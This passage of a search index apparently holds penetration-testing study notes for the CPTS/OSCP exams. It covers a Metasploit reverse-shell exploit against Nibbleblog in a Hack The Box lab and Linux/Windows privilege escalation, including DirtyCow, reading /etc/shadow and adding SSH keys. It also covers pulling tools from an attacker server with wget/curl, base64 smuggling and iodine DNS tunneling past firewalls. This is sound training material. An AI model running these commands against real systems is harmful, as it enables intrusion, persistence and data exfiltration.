modules. The exploit you are looking for is nibbleblog_file_upload, which takes advantage of a file upload vulnerability in Nibbleblog (an older version of blogging software).</p> </li> <li> <p>The relevant module will look like this:</p> <pre><code>exploit/multi/http/nibbleblog_file_upload\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#3-loading-the-exploit","title":"3. Loading the Exploit","text":"<ul> <li> <p>Select the exploit by either using its number (in the search result) or typing the full path of the module:</p> <pre><code>use 0  # This loads the first result, nibbleblog_file_upload.\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#4-setting-the-exploit-options","title":"4. Setting the Exploit Options","text":"<ul> <li> <p>Once the exploit is loaded, you need to set the options. These are the target\u2019s IP address (<code>RHOSTS</code>) and your attacking machine\u2019s IP address (<code>LHOST</code>), which is usually the <code>tun0</code> interface (comes with the VPN connection from Hack The Box).</p> <pre><code>set rhosts 10.129.42.190\nset lhost 10.10.14.2  # Replace this with your machine's tun0 IP.\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#5-showing-the-module-options","title":"5. Showing the Module Options","text":"<ul> <li> <p>Use <code>show options</code> to check what other values need to be set. This command will display the required parameters:</p> <pre><code>show options\n</code></pre> </li> <li> <p>The key parameters here are:</p> <ul> <li>RHOSTS: The target IP address.</li> <li>RPORT: The target port, typically 80 for web servers.</li> <li>USERNAME and PASSWORD: In this case, the username and password for the Nibbleblog admin user (use <code>admin</code> for username and <code>nibbles</code> for the password).</li> <li>TARGETURI: The path to the web application (set it to <code>nibbleblog</code>).</li> </ul> <p>Example commands:</p> <pre><code>set username admin\nset password nibbles\nset targeturi nibbleblog\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#6-setting-the-payload","title":"6. Setting the Payload","text":"<ul> <li> <p>After configuring the exploit options, you need to set a payload. By default, Metasploit suggests using <code>php/meterpreter/reverse_tcp</code>. However, you will switch this to a simpler payload like <code>generic/shell_reverse_tcp</code>, which gives you a reverse shell.</p> <pre><code>set payload generic/shell_reverse_tcp\n</code></pre> </li> <li> <p>Verify the payload options by typing <code>show options</code> again to make sure everything is set properly.</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#7-running-the-exploit","title":"7. Running the Exploit","text":"<ul> <li> <p>Once everything is configured, type <code>exploit</code> to run the attack:</p> <pre><code>exploit\n</code></pre> </li> <li> <p>This will initiate the exploit, uploading a malicious PHP file that gives you a reverse shell. Once it succeeds, you\u2019ll see a shell prompt connected to the target.</p> </li> <li> <p>You can confirm you have gained access by typing:</p> <pre><code>id\n</code></pre> <p>This command will return something like:</p> <pre><code>uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)\n</code></pre> <p>indicating that you're now logged in as the <code>nibbler</code> user.</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#8-privilege-escalation","title":"8. Privilege Escalation","text":"<ul> <li>From this point, you can follow the same privilege escalation steps you used earlier (e.g., checking for writable scripts, misconfigured permissions, or running <code>LinEnum</code> to find possible privilege escalation paths).</li> </ul> <p>When gaining initial access to a system, it's often in the context of a low-privileged user. To fully compromise the machine, we need to escalate our privileges to a root or SYSTEM-level user. Here\u2019s a breakdown of common privilege escalation techniques and commands.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#privilege-escalation-checklists","title":"Privilege Escalation Checklists","text":"<p>Using checklists helps with thorough enumeration for privilege escalation. Common resources include:</p> <ul> <li>HackTricks - Linux Privilege Escalation and Windows Privilege Escalation</li> <li>PayloadsAllTheThings - Extensive privilege escalation checklists for both Linux and Windows.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#enumeration-scripts","title":"Enumeration Scripts","text":"<p>Automated enumeration scripts help streamline identifying vulnerabilities:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#linux-enumeration-scripts","title":"Linux Enumeration Scripts","text":"<ul> <li> <p>LinEnum: Runs commands to find privilege escalation vectors.</p> <pre><code>./LinEnum.sh\n</code></pre> </li> <li> <p>LinPEAS (part of PEASS):</p> <pre><code>./linpeas.sh\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#windows-enumeration-scripts","title":"Windows Enumeration Scripts","text":"<ul> <li> <p>Seatbelt:</p> <pre><code>.\\\\Seatbelt.exe -group=all\n</code></pre> </li> <li> <p>JAWS:</p> <pre><code>.\\\\JAWS.ps1\n</code></pre> </li> </ul> <p>Note: These scripts generate \"noise\" and may trigger security tools.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#kernel-exploits","title":"Kernel Exploits","text":"<p>If the target system is running an outdated or vulnerable kernel, you can search for and exploit kernel vulnerabilities.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#example-searching-for-kernel-exploits","title":"Example: Searching for Kernel Exploits","text":"<ul> <li> <p>For Linux:</p> <pre><code>uname -r  # Get kernel version\nsearchsploit linux kernel  # Search for known exploits\n</code></pre> </li> <li> <p>For Windows:</p> <ul> <li>Use the Windows version from system info, then search for known vulnerabilities.</li> </ul> <pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#example-kernel-exploit-dirtycow-linux","title":"Example Kernel Exploit: DirtyCow (Linux)","text":"<p>If the server is running an old kernel version, such as <code>3.9.0-73-generic</code>, we might find vulnerabilities like DirtyCow (CVE-2016-5195). Download and compile the exploit, then run it to gain root access:</p> <pre><code>gcc -o cow dirtycow.c -pthread\n./cow\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#vulnerable-software","title":"Vulnerable Software","text":"<p>Check for outdated or vulnerable software versions:</p> <ul> <li> <p>Linux: List installed software with <code>dpkg -l</code> and look for exploits.</p> <pre><code>dpkg -l | grep -i apache  # Example for Apache\n</code></pre> </li> <li> <p>Windows: Explore <code>C:\\\\Program Files</code> or <code>C:\\\\Program Files (x86)</code> for potentially vulnerable applications.</p> <pre><code>Get-WmiObject -Class Win32_Product  # Lists installed programs\n</code></pre> </li> </ul> <p>Search for exploits using resources like Exploit-DB or Google.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#user-privileges","title":"User Privileges","text":"<p>Check for ways the current user can run commands with elevated privileges.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#sudo-privileges-linux","title":"Sudo Privileges (Linux)","text":"<p>Check what commands the user can run with <code>sudo</code>:</p> <pre><code>sudo -l\n</code></pre> <p>If you see <code>(ALL : ALL) ALL</code>, it means you can run all commands as root:</p> <pre><code>sudo su -\nwhoami  # root\n</code></pre> <p>If the <code>NOPASSWD</code> option is present, it allows command execution without requiring a password:</p> <pre><code>sudo -u user /bin/echo \"Hello, World!\"\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#suidsgid-binaries-linux","title":"SUID/SGID Binaries (Linux)","text":"<p>Search for SUID binaries, which may allow privilege escalation:</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#windows-token-privileges","title":"Windows Token Privileges","text":"<p>Use tools like whoami to check token privileges:</p> <pre><code>whoami /priv\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#scheduled-tasks-cron-jobs","title":"Scheduled Tasks &amp; Cron Jobs","text":"<p>Both Linux and Windows use scheduled tasks that can be exploited if misconfigured.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#cron-jobs-linux","title":"Cron Jobs (Linux)","text":"<p>Check for cron jobs and their permissions:</p> <pre><code>cat /etc/crontab\n</code></pre> <p>If you can edit or write to a cron job script, you can execute arbitrary commands, such as creating a reverse shell.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#scheduled-tasks-windows","title":"Scheduled Tasks (Windows)","text":"<p>List scheduled tasks and check for writable permissions:</p> <pre><code>schtasks /query /fo LIST /v\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#exposed-credentials","title":"Exposed Credentials","text":"<p>Search for credentials in configuration files, logs, or user history.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#example-find-exposed-credentials-in-linux","title":"Example: Find exposed credentials in Linux","text":"<p>Use tools like grep or an enumeration script:</p> <pre><code>grep -i \"password\" /etc/passwd /etc/shadow\n</code></pre> <p>Example output from an enumeration script:</p> <pre><code>/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');\n</code></pre> <p>Use exposed credentials for further access, such as MySQL login or SSH.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#ssh-keys","title":"SSH Keys","text":"<p>If SSH keys are readable, they can provide access to user accounts or root. SSH keys are typically stored in <code>~/.ssh/id_rsa</code>.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#example-using-ssh-keys-to-log-in-linux","title":"Example: Using SSH Keys to Log In (Linux)","text":"<pre><code>chmod 600 id_rsa  # Set proper permissions\nssh -i id_rsa user@target_IP\n</code></pre> <p>If you have write access to a user's <code>.ssh/authorized_keys</code>, you can add your own public key to gain access.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#example-adding-public-key-to-gain-ssh-access","title":"Example: Adding Public Key to Gain SSH Access","text":"<p>On your machine:</p> <pre><code>ssh-keygen -f key\n</code></pre> <p>On the target machine:</p> <pre><code>echo \"ssh-rsa AAAA...key...\" &gt;&gt; /home/user/.ssh/authorized_keys\n</code></pre> <p>Now, SSH into the target machine:</p> <pre><code>ssh -i key user@target_IP\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#command-summary","title":"Command Summary","text":"Command Description <code>./LinEnum.sh</code> Linux enumeration script <code>./linpeas.sh</code> PEAS Linux enumeration script <code>./Seatbelt.exe -group=all</code> Windows enumeration script <code>uname -r</code> Check Linux kernel version <code>dpkg -l</code> List installed Linux software <code>sudo -l</code> Check sudo privileges <code>find / -perm -u=s -type f 2&gt;/dev/null</code> Find SUID binaries <code>cat /etc/crontab</code> List Linux cron jobs <code>schtasks /query /fo LIST /v</code> List Windows scheduled tasks <code>ssh -i id_rsa user@target_IP</code> SSH login using private key <code>whoami /priv</code> Check Windows token privileges","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#study-tips","title":"Study Tips","text":"<ol> <li>Practice Enumeration: Use scripts like LinPEAS and Seatbelt on lab machines to get familiar with their output.</li> <li>Master Manual Checks: Scripts create noise, so practice manual enumeration to avoid detection.</li> <li>Understand Exploit Impact: Test kernel and software exploits in a safe environment before using them in production.</li> <li>Learn SUID/SGID and sudo: Privileges are critical in Linux environments, so practice exploiting SUID binaries and sudo misconfigurations.</li> <li>Use Real-world Examples: Recreate vulnerable environments to apply these techniques hands-on.</li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/","title":"Transferring Files","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#overview","title":"Overview","text":"<p>During penetration testing, transferring files such as enumeration scripts, exploits, or other data between an attack machine and a remote server is common. Here, we'll explore different methods for securely and efficiently transferring files when you have code execution or SSH access to a remote host.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#methods-for-transferring-files","title":"Methods for Transferring Files","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#1-using-wget-and-curl","title":"1. Using <code>wget</code> and <code>cURL</code>","text":"<p>Scenario: You have command-line access to the remote host, and the host can reach your machine via network.</p> <ul> <li> <p>Python HTTP Server Setup on Attacker\u2019s Machine: Run a simple Python HTTP server to serve files from your directory.</p> <pre><code>cd /path/to/your/file\npython3 -m http.server 8000\n</code></pre> <p>This starts serving files from the directory on <code>http://your_ip:8000/</code>.</p> </li> <li> <p>Download on the Remote Host (with <code>wget</code>): On the remote machine, download the file using:</p> <pre><code>wget http://your_ip:8000/filename.sh\n</code></pre> </li> <li> <p>Alternative Download (with <code>cURL</code>): If <code>wget</code> is not available, use <code>cURL</code>:</p> <pre><code>curl http://your_ip:8000/filename.sh -o filename.sh\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#2-using-scp-secure-copy","title":"2. Using <code>scp</code> (Secure Copy)","text":"<p>Scenario: You have SSH credentials for the remote host.</p> <ul> <li> <p>Transfer a file to the remote machine using <code>scp</code>:</p> <pre><code>scp filename.sh user@remotehost:/path/to/save/\n</code></pre> </li> <li> <p>You will be prompted for the SSH password if not using key-based authentication.</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#3-using-base64-encoding","title":"3. Using <code>base64</code> Encoding","text":"<p>Scenario: Direct file transfers are blocked by firewalls, so you use a copy-paste method with base64 encoding.</p> <ul> <li> <p>Encode the File (Attacker\u2019s Machine): Convert the file to a base64 string to avoid firewall issues.</p> <pre><code>base64 filename -w 0\n</code></pre> </li> <li> <p>Encode the file using <code>base64</code> and generate a single-line string with the <code>-w 0</code> option to avoid line breaks:</p> </li> <li> <p>Decode the File (Remote Host): Copy the base64 string to the remote host, decode it, and save the result to a file.</p> <pre><code>echo \"base64_string\" | base64 -d &gt; output_file\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#method-2-use-a-text-file","title":"Method 2: Use a Text File","text":"<ol> <li> <p>On the Attacker Machine:</p> <p>Encode the file and save the base64 output to a text file:</p> <pre><code>base64 filename -w 0 &gt; base64_encoded.txt\n</code></pre> </li> <li> <p>Transfer the Text File:</p> <p>Use any of the regular file transfer methods (like <code>scp</code>, <code>wget</code>, or <code>curl</code>) to transfer the <code>base64_encoded.txt</code> file to the target machine.</p> </li> <li> <p>On the Target Machine:</p> <p>Decode the file:</p> <pre><code>cat base64_encoded.txt | base64 -d &gt; output_filename\n</code></pre> </li> <li> <p>Verify the Transfer:</p> <p>Again, verify using <code>file</code> or <code>md5sum</code> to confirm successful transfer.</p> </li> </ol> <p>This process is useful when you can't directly transfer files due to firewall or other restrictions, but you still have a way to copy-paste text or transfer a text file to the target machine.</p> <p>If you're unable to use copy-paste between your attacker machine and the target machine, and file transfer methods are blocked by a firewall, you can use interactive manual typing or split the base64 string into smaller parts. Here are alternative methods:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#method-1-manual-typing-for-small-files","title":"Method 1: Manual Typing (For Small Files)","text":"<p>If the file you're trying to transfer is small (or you have no other options), you could manually type the base64-encoded string into the target machine. However, this is tedious and prone to errors, so it's not ideal for larger files.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#method-2-break-the-base64-string-into-chunks-more-practical","title":"Method 2: Break the Base64 String into Chunks (More Practical)","text":"<p>If you can't copy and paste the entire base64 string but have SSH or remote command execution, you can break the base64 string into smaller, manageable chunks and manually transfer each chunk to the target machine. You can then reassemble the file on the target.</p> <ol> <li> <p>On the Attacker Machine:</p> <ul> <li> <p>Encode the file and split it into smaller chunks:This will create multiple chunk files (e.g., <code>base64_chunk_aa</code>, <code>base64_chunk_ab</code>, <code>base64_chunk_ac</code>, etc.), each containing part of the base64-encoded string. The <code>b 1000</code> flag specifies the chunk size (1000 bytes per file).</p> <pre><code>base64 filename | split -b 1000 - base64_chunk_\n</code></pre> </li> </ul> </li> <li> <p>On the Target Machine:</p> <ul> <li> <p>Manually type each chunk or send each chunk individually through the available remote access method:</p> <ul> <li> <p>First, start an empty file to store the reassembled base64 string:</p> <pre><code>touch assembled_base64.txt\n</code></pre> </li> <li> <p>Append each chunk one by one. You can manually type the content of each chunk into the file (or send it via SSH if possible):</p> <pre><code>echo \"base64_chunk_aa_content_here\" &gt;&gt; assembled_base64.txt\necho \"base64_chunk_ab_content_here\" &gt;&gt; assembled_base64.txt\n</code></pre> <p>(Continue until all chunks are added to <code>assembled_base64.txt</code>.)</p> </li> </ul> </li> </ul> </li> <li> <p>Decode the Reassembled Base64 File:</p> <ul> <li> <p>Once all chunks are added to <code>assembled_base64.txt</code>, decode the base64 string into the original file:</p> <pre><code>cat assembled_base64.txt | base64 -d &gt; output_filename\n</code></pre> </li> </ul> </li> <li> <p>Verify the Transfer:</p> <ul> <li> <p>Verify that the file was transferred successfully using:</p> <pre><code>file output_filename\nmd5sum output_filename\n</code></pre> </li> </ul> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#method-3-command-injection-or-reverse-shell-exploit","title":"Method 3: Command Injection or Reverse Shell Exploit","text":"<p>If you have a limited reverse shell or command injection vulnerability on the target, you could transfer chunks of the base64 string by executing commands directly on the remote machine:</p> <ol> <li> <p>On the Attacker Machine:</p> <ul> <li> <p>Encode the file and split the base64 string into small parts, as shown in Method 2.</p> <ol> <li>On the Target Machine (via Shell or Command Injection):</li> </ol> </li> <li> <p>Run commands to append each chunk into a file on the target machine:Continue until all chunks are transferred.</p> <pre><code>echo \"base64_chunk_aa_content_here\" &gt;&gt; /tmp/assembled_base64.txt\necho \"base64_chunk_ab_content_here\" &gt;&gt; /tmp/assembled_base64.txt\n</code></pre> </li> </ul> </li> <li> <p>Decode the File: After all chunks have been sent, decode the base64 string:</p> <pre><code>cat /tmp/assembled_base64.txt | base64 -d &gt; output_filename\n</code></pre> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#method-4-using-dns-or-http-tunneling","title":"Method 4: Using DNS or HTTP Tunneling","text":"<p>If direct file transfer is blocked but you can make outbound DNS or HTTP requests, you could use a DNS exfiltration or HTTP tunneling tool to transfer data in smaller chunks. This is more advanced but can bypass some firewall restrictions.</p> <p>When traditional file transfer methods like <code>wget</code>, <code>scp</code>, or even manual copy-pasting aren't working due to firewalls or network restrictions, DNS or HTTP tunneling can be used to bypass these restrictions. These methods work by encapsulating your data in seemingly normal DNS or HTTP requests, which are typically allowed through firewalls.</p> <p>Here's how you can achieve file transfer via DNS or HTTP tunneling:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#dns-tunneling","title":"DNS Tunneling","text":"<p>DNS tunneling uses the DNS protocol to send data across a network by encoding it into DNS queries and responses. This technique can be used to bypass firewalls that don't block DNS traffic.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#steps-for-dns-tunneling","title":"Steps for DNS Tunneling:","text":"<ol> <li> <p>Set up a DNS tunneling server on the attacker machine: You need a tool like Iodine or Dnscat2 to set up a DNS tunnel server. These tools encode data in DNS queries that the client sends to the server.</p> <p>Example using Iodine:</p> <ul> <li> <p>On the attacker machine (the DNS server):</p> <p>```bash            sudo apt-get install iodine sudo iodined -f 10.0.0.1 example.com</p> <p>```</p> <p>Replace <code>example.com</code> with your registered domain that you control. You must configure your DNS to point to the attacker's server.</p> </li> </ul> </li> <li> <p>Set up the DNS tunneling client on the target machine:</p> <ul> <li> <p>If you can execute commands on the target machine, you can use Iodine as a client to connect back to your server:</p> <pre><code>sudo apt-get install iodine\nsudo iodine -f 10.0.0.1 example.com\n</code></pre> <p>This creates a virtual network interface on the target that allows data to flow through the DNS tunnel.</p> </li> </ul> </li> <li> <p>Transfer files through the DNS tunnel:</p> <ul> <li>Once the tunnel is established, you can use standard file transfer protocols like <code>scp</code>, <code>wget</code>, or <code>curl</code> over this DNS tunnel.</li> </ul> <p>You can also tunnel a command shell or other traffic through this interface.</p> </li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#tools-for-dns-tunneling","title":"Tools for DNS Tunneling:","text":"<ul> <li>Iodine: A tool for setting up DNS tunneling over a virtual network interface.</li> <li>dnscat2: A tool specifically designed for exfiltrating data using DNS queries.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#scenario","title":"Scenario","text":"<p>You have access to the target machine, but traditional file transfer methods (like <code>scp</code>, <code>wget</code>, or <code>curl</code>) are blocked due to a firewall. However, the firewall allows DNS traffic. You want to use DNS tunneling to transfer files from your attacker machine (your local machine) to the target machine by encapsulating data in DNS queries.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-1-set-up-dns-tunneling-on-your-attacker-machine","title":"Step 1: Set up DNS Tunneling on Your (Attacker) Machine","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#11-install-iodine-on-the-attacker-machine","title":"1.1 Install Iodine on the Attacker Machine","text":"<p>First, ensure that Iodine is installed on your local machine (the attacker).</p> <pre><code>sudo apt-get install iodine\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#12-configure-dns-for-your-domain","title":"1.2 Configure DNS for Your Domain","text":"<ul> <li>You need a domain name that you control (e.g., <code>example.com</code>).</li> <li>Create a DNS <code>A</code> record for your domain pointing to your attacker machine\u2019s public IP (e.g., <code>123.45.67.89</code>).</li> <li>This will allow DNS requests to reach your server.</li> </ul> <p>Example:</p> <ul> <li>Domain: <code>example.com</code></li> <li>Subdomain for tunneling: <code>tunnel.example.com</code> \u2192 points to <code>123.45.67.89</code></li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#13-start-the-iodine-server-on-your-attacker-machine","title":"1.3 Start the Iodine Server on Your Attacker Machine","text":"<p>Run the following command to start the DNS tunneling server. Assign an internal IP (like <code>10.0.0.1</code>) to the virtual network interface.</p> <pre><code>sudo iodined -f 10.0.0.1 tunnel.example.com\n</code></pre> <p>Here:</p> <ul> <li><code>f</code> makes Iodine run in the foreground (you can omit this if you want it to run in the background).</li> <li><code>10.0.0.1</code> is the IP address assigned to the virtual interface on the DNS tunnel.</li> <li><code>tunnel.example.com</code> is the subdomain you set up for tunneling.</li> </ul> <p>After running the command, you should see output indicating the Iodine server is running, similar to this:</p> <pre><code>Opened dns0\nSending fake version: Iodine 0.7.0\nSetting IP of dns0 to 10.0.0.1\nReady, tunnel.example.com is up and running.\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-2-set-up-dns-tunneling-on-the-target-machine","title":"Step 2: Set up DNS Tunneling on the Target Machine","text":"<p>Now that the DNS tunnel server is running on your attacker machine, you need to configure the target machine to connect to it via DNS tunneling.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#21-install-iodine-on-the-target-machine","title":"2.1 Install Iodine on the Target Machine","text":"<p>If Iodine is not already installed on the target machine, and you have enough privileges, install it:</p> <pre><code>sudo apt-get install iodine\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#22-start-the-iodine-client-on-the-target-machine","title":"2.2 Start the Iodine Client on the Target Machine","text":"<p>Run the following command on the target machine to connect to your DNS tunneling server:</p> <pre><code>sudo iodine -f 123.45.67.89 tunnel.example.com\n</code></pre> <p>Here:</p> <ul> <li><code>123.45.67.89</code> is the public IP address of your attacker machine where the DNS tunneling server is running.</li> <li><code>tunnel.example.com</code> is the subdomain you set up for DNS tunneling.</li> </ul> <p>This will initiate a connection to the DNS tunneling server on your attacker machine, creating a virtual network interface on the target machine.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#23-verify-connection","title":"2.3 Verify Connection","text":"<p>Once the connection is established, a virtual network interface (like <code>dns0</code>) should be created on the target machine. This interface will have an internal IP, such as <code>10.0.0.2</code>.</p> <p>Run the following command on the target machine to verify the virtual interface and IP address:</p> <pre><code>bash\nCopy code\nifconfig dns0\n</code></pre> <p>The output should show something like:</p> <pre><code>dns0      Link encap:UNSPEC  HWaddr ...\n          inet addr:10.0.0.2  P-t-P:10.0.0.1 Mask:255.255.255.0\n          ...\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-3-transfer-files-over-the-dns-tunnel","title":"Step 3: Transfer Files Over the DNS Tunnel","text":"<p>Now that the DNS tunnel is established, you can transfer files from the attacker machine to the target or vice versa.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#31-on-the-attacker-machine","title":"3.1 On the Attacker Machine","text":"<p>You can use <code>scp</code> or other tools over the DNS tunnel to transfer files. Here\u2019s an example of transferring a file using <code>scp</code>:</p> <pre><code>bash\nCopy code\nscp -P 22 /path/to/localfile user@10.0.0.2:/path/to/remotefile\n</code></pre> <p>Here:</p> <ul> <li><code>10.0.0.2</code> is the virtual IP address of the target machine (inside the tunnel).</li> <li><code>/path/to/localfile</code> is the path of the file you want to transfer on your attacker machine.</li> <li><code>/path/to/remotefile</code> is the destination path on the target machine.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-4-validate-file-transfer","title":"Step 4: Validate File Transfer","text":"<p>After transferring the file, you can verify the integrity of the file on both machines by running <code>md5sum</code>:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#on-the-attacker-machine","title":"On the Attacker Machine:","text":"<pre><code>bash\nCopy code\nmd5sum /path/to/localfile\n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#on-the-target-machine","title":"On the Target Machine:","text":"<pre><code>bash\nCopy code\nmd5sum /path/to/remotefile\n</code></pre> <p>Both outputs should be identical, confirming that the file transfer was successful.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#summary","title":"Summary","text":"<ol> <li>Set up DNS tunneling server on the attacker machine using Iodine.</li> <li>Configure DNS records for your domain to point to your attacker's public IP.</li> <li>Connect to the DNS tunneling server from the target machine using Iodine as the client.</li> <li>Use the virtual network interface (created via DNS tunneling) to transfer files or run commands.</li> </ol> <p>This method bypasses firewalls that block other traffic types but allow DNS, making it effective in environments with restricted outbound connections.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#tools-for-dns-tunneling_1","title":"Tools for DNS Tunneling","text":"<ul> <li>Iodine: A widely used tool for DNS tunneling.</li> <li>Dnscat2: Another popular tool for tunneling data over DNS.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#dns-tunneling-windows","title":"DNS Tunneling Windows","text":"<p>If the target machine is a Windows system, you can still set up DNS tunneling, but the process differs since Windows doesn't natively support Linux packages like <code>iodine</code>. However, there are Windows alternatives for DNS tunneling that you can use to connect to an Iodine server. Here's how you can achieve this on a Windows target:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-by-step-dns-tunneling-on-a-windows-target","title":"Step-by-Step: DNS Tunneling on a Windows Target","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-1-use-a-windows-client-for-dns-tunneling","title":"Step 1: Use a Windows Client for DNS Tunneling","text":"<p>Since you can't directly install <code>iodine</code> on Windows, you'll need a Windows-compatible tool. Here are a couple of options:</p> <ol> <li>Iodine for Windows (Portable):<ul> <li>There's a Windows version of Iodine available as a portable executable.</li> <li>You can download it from trusted sources (e.g., here on GitHub) or compile it yourself.</li> </ul> </li> <li>DNSCat2:<ul> <li>An alternative tunneling tool that also works over DNS. It has a Windows client available.</li> <li>It can be downloaded from GitHub DNSCat2 repository.</li> </ul> </li> </ol> <p>For this guide, let's use Iodine for Windows.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Transferring%20Files/#step-2-download-and-set-up-iodine-on-windows","title":"Step 2: Download and Set Up Iodine on Windows","text":"<ol> <li> <p>Download the Iodine Windows Client:</p> <ul> <li>Go to Iodine\u2019s GitHub page.</li> <li>Download the appropriate <code>.exe</code> file for your Windows version.</li> </ul> <p>Example: <code>iodine-win32-0.7.0.zip</code></p> </li> <li> <p>Extract the Executable:</p> <ul> 